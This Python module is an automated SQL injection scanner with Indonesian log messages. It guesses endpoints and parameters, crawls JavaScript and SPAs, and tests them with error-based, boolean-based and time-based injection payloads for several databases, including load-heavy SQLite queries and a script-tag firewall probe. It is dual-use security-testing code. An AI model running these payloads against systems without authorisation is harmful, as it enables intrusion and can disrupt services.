# checker/sqli.py — SQLInjectionChecker v3
import re
import time
import requests as _requests
import threading
import urllib3
from typing import Dict, Any, Optional, List
from urllib.parse import urljoin, quote, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from helpers.http_client import HttpClient
from helpers.browser import crawl_spa
from helpers.parsers import (
    is_spa_html, spa_confidence,
    extract_forms, extract_paths_from_js,
    extract_all_js_paths, normalize_url,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


# ── Terminal output helpers ───────────────────────────────────────────────────

def _info(msg: str):  print(f"  [*] {msg}")
def _ok(msg: str):    print(f"  [+] {msg}")
def _warn(msg: str):  print(f"  [!] {msg}")
def _step(n: int, total: int, msg: str): print(f"\n  [{n}/{total}] {msg}")


# ── HTTP Headers ──────────────────────────────────────────────────────────────

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,*/*',
}

JSON_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, */*',
    'X-Requested-With': 'XMLHttpRequest',
}


# ── Payloads ──────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",
    '"',
    "' --",
    "') --",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=CONVERT(int,'a')--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

BOOL_PAIRS = [
    ("XNOTEXISTX' OR '1'='1'--",  "XNOTEXISTX' OR '1'='2'--"),
    ("XNOTEXISTX' OR 1=1--",      "XNOTEXISTX' OR 1=2--"),
    ("XNOTEXISTX' OR 'a'='a'--",  "XNOTEXISTX' OR 'a'='b'--"),
    ("0 OR 1=1",                  "0 OR 1=2"),
    ("0) OR (1=1",                "0) OR (1=2"),
]

TIME_PAYLOADS_ALL = {
    "MySQL": [
        ("' OR SLEEP(5)--",                  "MySQL"),
        ("' AND SLEEP(5)--",                 "MySQL"),
        ("' OR (SELECT SLEEP(5))--",         "MySQL"),
        ("1 OR SLEEP(5)--",                  "MySQL"),
    ],
    "SQLite": [
        ("' AND (SELECT HEX(RANDOMBLOB(50000000)))!=''--",                          "SQLite"),
        ("' OR (SELECT HEX(RANDOMBLOB(50000000)))!=''--",                           "SQLite"),
        ("' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master m2,sqlite_master m3)>0--", "SQLite"),
    ],
    "PostgreSQL": [
        ("' OR (SELECT pg_sleep(5)) IS NOT NULL--",  "PostgreSQL"),
        ("' AND (SELECT pg_sleep(5)) IS NOT NULL--", "PostgreSQL"),
        ("'||(SELECT pg_sleep(5))||'",               "PostgreSQL"),
    ],
    "MSSQL": [
        ("' WAITFOR DELAY '0:0:5'--",  "MSSQL"),
        ("'; WAITFOR DELAY '0:0:5'--", "MSSQL"),
    ],
    "Oracle": [
        ("' OR 1=1 AND (SELECT COUNT(*) FROM ALL_OBJECTS)>0--", "Oracle"),
    ],
    "Unknown": [
        ("' OR SLEEP(5)--",                          "MySQL"),
        ("' AND (SELECT HEX(RANDOMBLOB(50000000)))!=''--", "SQLite"),
        ("' OR (SELECT pg_sleep(5)) IS NOT NULL--",  "PostgreSQL"),
        ("' WAITFOR DELAY '0:0:5'--",                "MSSQL"),
    ],
}

DB_ERROR_SIGNATURES = {
    'sqlite3.operationalerror':   'SQLite',
    'operationalerror':           'SQLite',
    'sqlite_master':              'SQLite',
    'unrecognized token':         'SQLite',
    'no such table':              'SQLite',
    'no such column':             'SQLite',
    'sqlalche.me':                'SQLite',
    'sql: select':                'SQLite',
    'incomplete input':           'SQLite',
    'you have an error in your sql syntax': 'MySQL',
    'warning: mysql':             'MySQL',
    'mysql_fetch':                'MySQL',
    'supplied argument is not a valid mysql': 'MySQL',
    'mysql_num_rows':             'MySQL',
    'pg_query()':                 'PostgreSQL',
    'pg_exec()':                  'PostgreSQL',
    'unterminated quoted string': 'PostgreSQL',
    'pgsql error':                'PostgreSQL',
    'microsoft sql server':       'MSSQL',
    'unclosed quotation mark':    'MSSQL',
    'syntax error converting':    'MSSQL',
    'odbc sql server':            'MSSQL',
    'ora-01756':                  'Oracle',
    'ora-00933':                  'Oracle',
    'oracle error':               'Oracle',
    'sql syntax':                 'Unknown',
    'sql error':                  'Unknown',
    'database error':             'Unknown',
    'query failed':               'Unknown',
    'pdoexception':               'Unknown',
    'sqlstate':                   'Unknown',
    'syntax error':               'Unknown',
}

CLOUDFLARE_SIGNATURES = [
    'cloudflare', 'cf-ray', 'just a moment',
    'checking your browser', 'cdn-cgi',
    'enable javascript', 'ddos protection',
    'ray id', 'cf_clearance',
]

TEST_ENDPOINTS = [
    '/search', '/products', '/items', '/users',
    '/profile', '/article', '/news', '/category',
    '/login', '/api/search', '/api/products',
    '/api/users', '/api/items', '/api/posts',
    '/api/posts/search', '/posts/search',
    '/api/articles', '/api/comments', '/api/categories',
]

API_SQLI_SUFFIXES = [
    '/search', '/find', '/query', '/filter',
    '/list', '/detail', '/get',
    '/posts/search', '/users/search', '/items/search',
]

TEST_PARAMS = [
    'q', 'id', 'search', 'query', 'keyword',
    'name', 'user', 'item', 'filter', 'cat',
    'page', 'sort', 'order', 'key', 'term',
    'username', 'email', 'title', 'slug', 'tag',
]


# ── Severity ──────────────────────────────────────────────────────────────────

SEVERITY_VULN_KEY: dict[str, str] = {
    'CRITICAL': 'SQLI_CRITICAL',
    'HIGH':     'SQLI_HIGH',
    'MEDIUM':   'SQLI_MEDIUM',
    'LOW':      'SQLI_LOW',
}

_AUTH_PATHS = {'login', 'signin', 'auth', 'oauth', 'callback', 'register', 'admin'}

# Error-based pada db spesifik → HIGH/CRITICAL
_CRITICAL_DB_ERRORS = {'MySQL', 'PostgreSQL', 'MSSQL', 'Oracle'}


def _classify_severity(sqli_type: str, db_type: str, url: str) -> str:
    parsed_path = urlparse(url).path.lower()
    is_auth     = any(kw in parsed_path for kw in _AUTH_PATHS)

    if sqli_type == 'error-based':
        if db_type in _CRITICAL_DB_ERRORS or is_auth:
            return 'CRITICAL'
        return 'HIGH'

    if sqli_type == 'boolean-based':
        return 'CRITICAL' if is_auth else 'HIGH'

    if sqli_type == 'time-based':
        return 'HIGH'

    # form scan
    if 'form' in sqli_type:
        if db_type in _CRITICAL_DB_ERRORS or is_auth:
            return 'CRITICAL'
        return 'HIGH'

    return 'MEDIUM'


# ── Helpers ───────────────────────────────────────────────────────────────────

def _extract_js_srcs(html: str, base_url: str = '') -> List[str]:
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html, 'html.parser')
    srcs = []
    for s in soup.find_all('script'):
        src = s.get('src', '').strip()
        if src:
            srcs.append(normalize_url(src, base_url))
    for link in soup.find_all('link'):
        rel = link.get('rel', [])
        rel_str = ' '.join(rel).lower() if isinstance(rel, list) else str(rel).lower()
        href = link.get('href', '').strip()
        if 'modulepreload' in rel_str and href and href.endswith(('.js', '.mjs')):
            srcs.append(normalize_url(href, base_url))
        if 'preload' in rel_str and link.get('as') == 'script' and href:
            srcs.append(normalize_url(href, base_url))
    return list(dict.fromkeys(srcs))


def _raw_get(url: str, timeout: int = 8, **kwargs):
    try:
        return _requests.get(url, timeout=timeout, verify=False,
                             allow_redirects=True, **kwargs)
    except Exception:
        return None


def _raw_post(url: str, timeout: int = 8, **kwargs):
    try:
        return _requests.post(url, timeout=timeout, verify=False,
                              allow_redirects=True, **kwargs)
    except Exception:
        return None


def _enc(payload: str) -> str:
    return quote(payload, safe='')


# ── Main class ────────────────────────────────────────────────────────────────

class SQLInjectionChecker:
    def __init__(
        self,
        url: str,
        timeout: float = 8.0,
        extra_paths: Optional[List[str]] = None,
        cookies: Optional[Dict] = None,
    ):
        self.base_url            = url.rstrip('/')
        self.timeout             = int(timeout)
        self.extra_paths         = extra_paths or []
        self.cookies             = cookies or {}
        self._found_urls: set    = set()
        self._is_spa             = False
        self._waf_detected       = False
        self._api_bases: List    = []
        self._playwright_cookies = {}
        self._lock               = threading.Lock()
        self._detected_db: str   = 'Unknown'
        self._vuln_found         = threading.Event()

        self._client = HttpClient(
            timeout=self.timeout,
            headers=HEADERS,
            cookies=self.cookies,
            verify=False,
            retries=1,
        )

    # ── Utils ─────────────────────────────────────────────────────────────────

    def _is_cloudflare_page(self, text: str) -> bool:
        return any(sig in text.lower() for sig in CLOUDFLARE_SIGNATURES)

    def _is_real_endpoint(self, r) -> bool:
        if not r:
            return False
        ct = r.headers.get('Content-Type', '').lower()
        if 'application/json' in ct:
            return True
        if self._is_cloudflare_page(r.text):
            return False
        if is_spa_html(r.text):
            return False
        return True

    def _detect_waf(self) -> bool:
        r = self._client.get(
            f"{self.base_url}/?x=<script>alert(1)</script>",
            headers=HEADERS
        )
        if not r:
            return False
        waf_headers = {'cf-ray', 'x-sucuri-id', 'x-firewall', 'x-waf', 'x-cdn'}
        if waf_headers & {k.lower() for k in r.headers.keys()}:
            return True
        if self._is_cloudflare_page(r.text):
            return True
        return r.status_code == 403

    # ── Endpoint discovery ────────────────────────────────────────────────────

    def _probe_endpoint(self, url: str, active: list):
        with self._lock:
            if url in active:
                return
        r = self._client.get(url, headers=JSON_HEADERS)
        if not r or r.status_code in (404, 410):
            return
        ct = r.headers.get('Content-Type', '').lower()
        if 'text/html' in ct and self._is_cloudflare_page(r.text):
            return

        should_add = False
        if 'application/json' in ct:
            should_add = True
        elif self._waf_detected and r.status_code == 403 \
                and not self._is_cloudflare_page(r.text):
            should_add = True
        elif r.status_code in (200, 201, 405) \
                and 'text/html' not in ct \
                and self._is_real_endpoint(r):
            should_add = True

        if should_add:
            with self._lock:
                if url not in active:
                    active.append(url)
                    _ok(f"Endpoint ditemukan: {url}")

    def _crawl_js_endpoints(self) -> List[str]:
        found = []
        r = self._client.get(self.base_url, headers=HEADERS)
        if not r:
            return found

        is_cf      = self._is_cloudflare_page(r.text)
        confidence = spa_confidence(r.text)

        if confidence >= 2 and not is_cf:
            self._is_spa = True
            _info("SPA terdeteksi, crawling dengan Playwright ...")
            if PLAYWRIGHT_AVAILABLE:
                try:
                    pw_data = crawl_spa(
                        self.base_url, block_images=True,
                        initial_cookies=[
                            {"name": k, "value": v, "url": self.base_url}
                            for k, v in self.cookies.items()
                        ] if self.cookies else None,
                    )
                    self._playwright_cookies = pw_data.get("cookies", {})
                    for call in pw_data.get("api_calls", []):
                        path = call["url"].replace(self.base_url, "").split("?")[0].split("#")[0]
                        if path and path != "/" and not path.startswith("http"):
                            found.append(path)
                    found.extend(extract_all_js_paths(pw_data.get("html", "")))
                    js_srcs = _extract_js_srcs(pw_data.get("html", ""), self.base_url)
                    for js_url in js_srcs:
                        js_r = self._client.get(js_url)
                        if js_r and js_r.ok:
                            found.extend(extract_paths_from_js(js_r.text))
                            self._extract_api_bases(js_r.text)
                except Exception as e:
                    _warn(f"Playwright gagal ({e}), fallback ke JS parsing")
                    self._fallback_js_crawl(r, found)
            else:
                _info("Playwright tidak tersedia, fallback ke JS parsing")
                self._fallback_js_crawl(r, found)
        else:
            self._fallback_js_crawl(r, found)

        unique = list(set(found))
        if self._api_bases:
            _info(f"External API ditemukan: {', '.join(self._api_bases)}")
        return unique

    def _fallback_js_crawl(self, r, found: list):
        js_srcs = _extract_js_srcs(r.text, self.base_url)
        for js_url in js_srcs:
            js_r = self._client.get(js_url)
            if js_r and js_r.ok:
                found.extend(extract_paths_from_js(js_r.text))
                self._extract_api_bases(js_r.text)
        found.extend(extract_all_js_paths(r.text))

    def _extract_api_bases(self, js_text: str):
        for api_url in re.findall(
            r'["\`](https?://[a-zA-Z0-9._-]+/api(?:/[a-zA-Z0-9_/-]*)?)["\`]',
            js_text
        ):
            base = api_url.rstrip('/')
            if base not in self._api_bases:
                self._api_bases.append(base)

        for base in re.findall(
            r'["\`](/api/[a-zA-Z0-9_-]+(?:/[a-zA-Z0-9_-]+)?)["\`]',
            js_text
        ):
            parts = base.strip('/').split('/')
            if len(parts) >= 2:
                normalized = '/' + '/'.join(parts[:2])
                if normalized not in self._api_bases:
                    self._api_bases.append(normalized)

    def _build_api_endpoints(self) -> List[str]:
        candidates = []
        for base in self._api_bases:
            for suffix in API_SQLI_SUFFIXES:
                full = (base.rstrip('/') + suffix) if base.startswith('http') \
                       else (base + suffix)
                candidates.append(full)
        return candidates

    # ── Core check helpers ────────────────────────────────────────────────────

    def _check_sqli_body(self, body: str, url: str, param: str,
                         payload: str, status: int, results: Dict, tag: str) -> bool:
        body_lower  = body.lower()
        matched_sig = None
        matched_db  = 'Unknown'

        for sig, db in DB_ERROR_SIGNATURES.items():
            if sig in body_lower:
                matched_sig = sig
                matched_db  = db
                break

        if not matched_sig:
            return False

        if matched_db != 'Unknown':
            with self._lock:
                self._detected_db = matched_db

        key = f"{tag}:{url}:{param}"
        registered = False
        with self._lock:
            if key not in self._found_urls:
                self._found_urls.add(key)
                registered = True

        if registered:
            # ── Tambahan: classify severity & vuln_key ────────────────────────
            vuln_url = f"{url}?{param}={payload}"
            severity = _classify_severity(tag.lower(), matched_db, url)
            parsed   = urlparse(url)

            _warn(f"SQLi {tag} [{severity}] → param={param} | db={matched_db} | status={status}")
            with self._lock:
                results['vulnerable_paths'].append({
                    'url':          vuln_url,
                    'path':         parsed.path,
                    'base':         f"{parsed.scheme}://{parsed.netloc}",
                    'param':        param,
                    'payload':      payload,
                    'type':         tag.lower(),
                    'signature':    matched_sig,
                    'db_type':      matched_db,
                    'severity':     severity,
                    'vuln_key':     SEVERITY_VULN_KEY.get(severity),
                    'file_count':   0,
                    'dir_count':    0,
                    'notable_files': [],
                    'is_nested':    False,
                })
                if not results['db_type']:
                    results['db_type'] = matched_db
        return True

    # ── Error-based ───────────────────────────────────────────────────────────

    def _error_based(self, url: str, param: str, results: Dict) -> bool:
        for payload in ERROR_PAYLOADS:
            with self._lock:
                results['total_tested'] += 1
            r = _raw_get(f"{url}?{param}={_enc(payload)}",
                         timeout=self.timeout, headers=JSON_HEADERS)
            if not r or self._is_cloudflare_page(r.text):
                continue
            ct = r.headers.get('Content-Type', '').lower()
            if 'text/html' in ct and 'json' not in ct and r.status_code != 500:
                continue
            if self._check_sqli_body(r.text, url, param, payload,
                                     r.status_code, results, 'Error-based'):
                return True
        return False

    # ── Boolean-based ─────────────────────────────────────────────────────────

    def _boolean_based(self, url: str, param: str, results: Dict) -> bool:
        try:
            r_empty = _raw_get(f"{url}?{param}=XNOTEXISTX999",
                               timeout=self.timeout, headers=JSON_HEADERS)
            if not r_empty or self._is_cloudflare_page(r_empty.text):
                return False
            ct = r_empty.headers.get('Content-Type', '').lower()
            if 'text/html' in ct and 'json' not in ct:
                return False
            empty_len = len(r_empty.text)

            for true_p, false_p in BOOL_PAIRS:
                with self._lock:
                    results['total_tested'] += 2

                r_true  = _raw_get(f"{url}?{param}={_enc(true_p)}",
                                   timeout=self.timeout, headers=JSON_HEADERS)
                r_false = _raw_get(f"{url}?{param}={_enc(false_p)}",
                                   timeout=self.timeout, headers=JSON_HEADERS)
                if not r_true or not r_false:
                    continue

                len_true       = len(r_true.text)
                len_false      = len(r_false.text)
                true_vs_empty  = abs(len_true - empty_len)
                false_vs_empty = abs(len_false - empty_len)
                ratio          = len_true / max(empty_len, 1)

                bool_detected = (
                    (true_vs_empty > 100 and false_vs_empty < 80) or
                    (ratio > 3.0 and false_vs_empty < 80 and true_vs_empty > 50)
                )

                if bool_detected:
                    confirmed = self._confirm_boolean(url, param, empty_len)
                    if not confirmed:
                        continue

                    key = f"Boolean-based:{url}:{param}"
                    registered = False
                    with self._lock:
                        if key not in self._found_urls:
                            self._found_urls.add(key)
                            registered = True
                    if registered:
                        _warn(f"SQLi Boolean-based → param={param} | "
                              f"true={len_true}b empty={empty_len}b ratio={ratio:.1f}x")
                        db       = results.get('db_type') or self._detected_db or 'Unknown'
                        # ── Tambahan: classify severity & vuln_key ────────────
                        severity = _classify_severity('boolean-based', db, url)
                        parsed   = urlparse(url)

                        with self._lock:
                            results['vulnerable_paths'].append({
                                'url':          f"{url}?{param}={true_p}",
                                'path':         parsed.path,
                                'base':         f"{parsed.scheme}://{parsed.netloc}",
                                'param':        param,
                                'payload':      true_p,
                                'type':         'boolean-based',
                                'signature':    f'true={len_true}b vs empty={empty_len}b '
                                               f'(ratio={ratio:.1f}, diff={true_vs_empty}b)',
                                'db_type':      db,
                                'severity':     severity,
                                'vuln_key':     SEVERITY_VULN_KEY.get(severity),
                                'file_count':   0,
                                'dir_count':    0,
                                'notable_files': [],
                                'is_nested':    False,
                            })
                            if not results['db_type']:
                                results['db_type'] = db
                    return True
        except Exception:
            pass
        return False

    def _confirm_boolean(self, url: str, param: str, empty_len: int) -> bool:
        confirm_pair = ("XNOTEXISTX' OR 'x'='x'--", "XNOTEXISTX' OR 'x'='y'--")
        r_t = _raw_get(f"{url}?{param}={_enc(confirm_pair[0])}",
                       timeout=self.timeout, headers=JSON_HEADERS)
        r_f = _raw_get(f"{url}?{param}={_enc(confirm_pair[1])}",
                       timeout=self.timeout, headers=JSON_HEADERS)
        if not r_t or not r_f:
            return False
        len_t = len(r_t.text)
        len_f = len(r_f.text)
        return abs(len_t - empty_len) > 100 and abs(len_f - empty_len) < 80

    # ── Time-based ────────────────────────────────────────────────────────────

    def _time_based(self, url: str, param: str, results: Dict) -> bool:
        baselines = []
        for _ in range(3):
            try:
                t0 = time.time()
                _raw_get(f"{url}?{param}=normalquery",
                         timeout=12, headers=JSON_HEADERS)
                baselines.append(time.time() - t0)
            except Exception:
                pass

        if not baselines:
            return False

        baselines.sort()
        baseline = baselines[len(baselines) // 2]
        baseline = max(baseline, 0.3)

        detected_db    = self._detected_db or 'Unknown'
        payloads_to_try = TIME_PAYLOADS_ALL.get(detected_db, TIME_PAYLOADS_ALL['Unknown'])

        for payload, db_hint in payloads_to_try:
            with self._lock:
                results['total_tested'] += 1
            try:
                t1      = time.time()
                _raw_get(f"{url}?{param}=1{_enc(payload)}",
                         timeout=20, headers=JSON_HEADERS)
                elapsed = time.time() - t1
                delta   = elapsed - baseline

                if elapsed >= 4.5 and delta >= 3.5:
                    key = f"Time-based:{url}:{param}"
                    registered = False
                    with self._lock:
                        if key not in self._found_urls:
                            self._found_urls.add(key)
                            registered = True
                    if registered:
                        _warn(f"SQLi Time-based → param={param} | "
                              f"delay={elapsed:.1f}s Δ+{delta:.1f}s | db={db_hint}")
                        # ── Tambahan: classify severity & vuln_key ────────────
                        severity = _classify_severity('time-based', db_hint, url)
                        parsed   = urlparse(url)

                        with self._lock:
                            results['vulnerable_paths'].append({
                                'url':          f"{url}?{param}=1{payload}",
                                'path':         parsed.path,
                                'base':         f"{parsed.scheme}://{parsed.netloc}",
                                'param':        param,
                                'payload':      payload,
                                'type':         'time-based',
                                'signature':    f'delay {elapsed:.1f}s '
                                               f'(Δ+{delta:.1f}s vs baseline {baseline:.2f}s)',
                                'db_type':      db_hint,
                                'severity':     severity,
                                'vuln_key':     SEVERITY_VULN_KEY.get(severity),
                                'file_count':   0,
                                'dir_count':    0,
                                'notable_files': [],
                                'is_nested':    False,
                            })
                            if not results['db_type']:
                                results['db_type'] = db_hint
                    return True

            except _requests.exceptions.Timeout:
                key = f"Time-based:{url}:{param}"
                registered = False
                with self._lock:
                    if key not in self._found_urls:
                        self._found_urls.add(key)
                        registered = True
                if registered:
                    _warn(f"SQLi Time-based (timeout >20s) → param={param} | db={db_hint}")
                    severity = _classify_severity('time-based', db_hint, url)
                    parsed   = urlparse(url)

                    with self._lock:
                        results['vulnerable_paths'].append({
                            'url':          f"{url}?{param}=1{payload}",
                            'path':         parsed.path,
                            'base':         f"{parsed.scheme}://{parsed.netloc}",
                            'param':        param,
                            'payload':      payload,
                            'type':         'time-based',
                            'signature':    'request timeout >20s',
                            'db_type':      db_hint,
                            'severity':     severity,
                            'vuln_key':     SEVERITY_VULN_KEY.get(severity),
                            'file_count':   0,
                            'dir_count':    0,
                            'notable_files': [],
                            'is_nested':    False,
                        })
                        if not results['db_type']:
                            results['db_type'] = db_hint
                return True
            except Exception:
                pass
        return False

    # ── Scan per endpoint ─────────────────────────────────────────────────────

    def _scan_endpoint(self, url: str, results: Dict):
        for param in TEST_PARAMS:
            if self._vuln_found.is_set():
                return
            err = self._error_based(url, param, results)
            if err:
                self._vuln_found.set()
                return
            if self._boolean_based(url, param, results):
                self._vuln_found.set()
                return

    def _scan_forms(self, results: Dict):
        r_main = self._client.get(self.base_url, headers=JSON_HEADERS)
        if not r_main or not r_main.ok or self._is_cloudflare_page(r_main.text):
            return
        for form in extract_forms(r_main.text, self.base_url):
            for inp in form['inputs']:
                param  = inp['name']
                action = form['action']
                for payload in ERROR_PAYLOADS:
                    with self._lock:
                        results['total_tested'] += 1
                    if form['method'] == 'post':
                        r = _raw_post(action, timeout=self.timeout,
                                      data={param: payload}, headers=JSON_HEADERS)
                    else:
                        r = _raw_get(f"{action}?{param}={_enc(payload)}",
                                     timeout=self.timeout, headers=JSON_HEADERS)
                    if not r or self._is_cloudflare_page(r.text):
                        continue
                    ct = r.headers.get('Content-Type', '').lower()
                    if 'text/html' in ct and 'json' not in ct and r.status_code != 500:
                        continue
                    if self._check_sqli_body(r.text, action, param, payload,
                                             r.status_code, results,
                                             'Error-based (form)'):
                        break

    # ── Main run ──────────────────────────────────────────────────────────────

    def run(self) -> Dict[str, Any]:
        results = {
            'vulnerable':       False,
            'vulnerable_paths': [],         
            'db_type':          None,
            'total_tested':     0,
            'findings':         [],
            'error':            None,
            'summary':          {},         
            'waf_detected':     False,
            'spa_detected':     False,
            'playwright_used':  False,
        }

        try:
            self._waf_detected      = self._detect_waf()
            results['waf_detected'] = self._waf_detected
            waf_status = "terdeteksi" if self._waf_detected else "tidak terdeteksi"
            pw_status  = "tersedia"   if PLAYWRIGHT_AVAILABLE else "tidak tersedia"
            _info(f"WAF: {waf_status} | Playwright: {pw_status}")

            _step(1, 3, "Mengumpulkan endpoint ...")
            active_endpoints = []

            if self.extra_paths:
                for path in self.extra_paths:
                    full = normalize_url(path, self.base_url)
                    with self._lock:
                        if full not in active_endpoints:
                            active_endpoints.append(full)
                            _ok(f"Extra path: {full}")

            with ThreadPoolExecutor(max_workers=15) as ex:
                futures = [
                    ex.submit(self._probe_endpoint,
                              urljoin(self.base_url, p), active_endpoints)
                    for p in TEST_ENDPOINTS
                ]
                for f in as_completed(futures):
                    try: f.result()
                    except Exception: pass

            js_paths = self._crawl_js_endpoints()
            results['spa_detected']    = self._is_spa
            results['playwright_used'] = PLAYWRIGHT_AVAILABLE and self._is_spa

            api_candidates = self._build_api_endpoints()
            with ThreadPoolExecutor(max_workers=15) as ex:
                futures = [
                    ex.submit(self._probe_endpoint, p, active_endpoints)
                    if p.startswith('http') else
                    ex.submit(self._probe_endpoint,
                              urljoin(self.base_url, p), active_endpoints)
                    for p in js_paths + api_candidates
                ]
                for f in as_completed(futures):
                    try: f.result()
                    except Exception: pass

            _info(f"Total {len(active_endpoints)} endpoint aktif")

            _step(2, 3, "Error-based & Boolean-based scan ...")
            with ThreadPoolExecutor(max_workers=5) as ex:
                futures = [
                    ex.submit(self._scan_endpoint, url, results)
                    for url in active_endpoints
                ]
                for f in as_completed(futures):
                    try: f.result()
                    except Exception: pass

            if not results['vulnerable_paths']:
                _step(3, 3, "Time-based scan ...")
                for url in active_endpoints:
                    found = False
                    for param in TEST_PARAMS[:5]:
                        if found:
                            break
                        if self._time_based(url, param, results):
                            found = True
            else:
                _step(3, 3, "Time-based dilewati (sudah ada temuan)")

            self._scan_forms(results)

            # ── Finalize + summary ────────────────────────────────────────────
            if results['vulnerable_paths']:
                results['vulnerable'] = True
                count = len(results['vulnerable_paths'])

                sev_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
                type_count: Dict[str, int] = {}
                for vp in results['vulnerable_paths']:
                    sev = vp.get('severity', 'MEDIUM')
                    sev_count[sev] = sev_count.get(sev, 0) + 1
                    t = vp.get('type', 'unknown')
                    type_count[t] = type_count.get(t, 0) + 1

                results['summary'] = {
                    'total_vulnerable_paths': count,
                    'db_type':                results['db_type'],
                    'severity_breakdown':     {k: v for k, v in sev_count.items() if v > 0},
                    'type_breakdown':         type_count,
                    'waf_detected':           results['waf_detected'],
                }

                results['findings'].append(
                    f"SQL Injection ditemukan pada {count} parameter."
                )
                for v in results['vulnerable_paths']:
                    results['findings'].append(
                        f"  -> [{v['type']}][{v.get('severity','?')}] {v['url']} "
                        f"(param: {v['param']}, db: {v['db_type']})"
                    )
                _ok(
                    f"Total: {count} SQLi | "
                    f"CRITICAL={sev_count.get('CRITICAL',0)} "
                    f"HIGH={sev_count.get('HIGH',0)} "
                    f"MEDIUM={sev_count.get('MEDIUM',0)}"
                )
            else:
                results['findings'].append("Tidak ditemukan indikasi SQL Injection.")

        except Exception as e:
            results['error'] = str(e)
        finally:
            self._client.close()

        return results